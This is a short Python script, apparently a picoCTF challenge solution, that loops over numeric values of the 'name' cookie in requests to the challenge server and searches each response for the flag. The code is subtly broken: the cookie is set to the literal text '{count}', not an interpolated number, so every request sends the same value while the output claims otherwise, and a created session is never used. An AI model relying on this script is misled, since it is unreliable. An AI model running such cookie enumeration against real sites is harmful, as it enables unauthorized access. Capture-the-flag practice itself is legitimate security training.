#!/bin/env python3
import requests
import re

# # POC
# url = "http://mercury.picoctf.net:54219/check"
# cookies = {'name': '1'}
# r = requests.get(url, cookies=cookies)

# # search will return None if 'picoCTF' not found
# search = re.search('picoCTF', r.text)
# print(search)



s = requests.Session()

# Let's automate this
count = 0

while count < 30:
    url = "http://mercury.picoctf.net:54219/check"
    cookies = {'name': '{count}'}
    r = requests.get(url, cookies=cookies)
    search = re.search('picoCTF', r.text)
    print(f"Cookie value: {count}", search)
    count += 1

s.close()